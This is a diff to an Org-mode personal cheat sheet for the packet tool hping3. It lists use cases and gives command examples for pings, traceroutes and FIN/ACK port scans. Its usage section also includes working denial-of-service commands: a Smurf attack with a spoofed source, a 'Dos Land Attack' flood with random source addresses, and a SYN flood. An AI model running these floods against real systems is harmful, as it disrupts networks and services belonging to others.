@@ -1,24 +1,23 @@
+#+TAGS: net anal sec_d
 
 
-
-
-* Description						    :net:anal:sec_do:
+* hping3						     :net:anal:sec_d:
+* Description
 This command is used to analyse and assemble tcp/ip packets. hping3 is based on the ping command but is not only limited to the icmp echo requests.
 
 ** Possible use cases
-+ Firewall testing
-+ Advanced port scanning
-+ Network testing, using different protocols, TOS, fragmentation
-+ Manual path MTU discovery
-+ Advanced traceroute
-+ Remote OS fingerprinting
-+ Remote uptime guessing
-+ TCP/IP stacks auditing
-
+- Firewall testing
+- Advanced port scanning
+- Network testing, using different protocols, TOS, fragmentation
+- Manual path MTU discovery
+- Advanced traceroute
+- Remote OS fingerprinting
+- Remote uptime guessing
+- TCP/IP stacks auditing
 
 * Usage
 
-+ Normal ping test
+** Normal ping test
 > hping3 -1 <domain.com>
 1 - protocol type (1 = icmp)
 
@@ -26,10 +25,10 @@ This command is used to analyse and assemble tcp/ip packets. hping3 is based on 
 > hping3 --traceroute -V -1 <domain.com>
 V - verbose
 
-+ Checking port
+** Checking port
 > hping3 -V -S -p <port\_number> -s <port\_number> <domain.com> 
 
-+ Traceroute to a specific port
+** Traceroute to a specific port
 > hping3 --traceroute -V -S -p <port\_number> -s <port\_number>
 <domain.com>
 
@@ -44,16 +43,16 @@ C - icmptype
 
 This is set for an icmp address mask request (type 17)
 
-+ Fin Port Scan
+** Fin Port Scan
 > hping3 -c 1 -V -p 80 -s 5050 -F <domain.com>
 
-+ Ack Port Scan
+** Ack Port Scan
 > hping3 -c 1 -V -p 80 -S 5050 -A <domain.com>
 
-+ Smurf Attack
+** Smurf Attack
 > hping3 -1 --flood -a <dest\_ip> <broadcast\_add>
 
-+ Dos Land Attack
+** Dos Land Attack
 > hping3 -1 -V -c 10000000 -d 120 -S -w 64 -p 445 -s 445 --flood
 --rand-source <dest\_ip>
 
@@ -62,6 +61,14 @@ rand-source - randomise the source ip
 d - data size
 w - window size
 
-+ Setting interface to use for Dos Rand Attack
-> hping3 -S -p 80 -s 5050 --flood --interface <ethx> --rand-source
-<dest\_ip>
+** Setting interface to use for Dos Rand Attack
+> hping3 -S -p 80 -s 5050 --flood --interface <ethx> --rand-source <dest\_ip>
+
+* Lecture
+* Tutorial
+* Books
+* Links
+
+
+
+
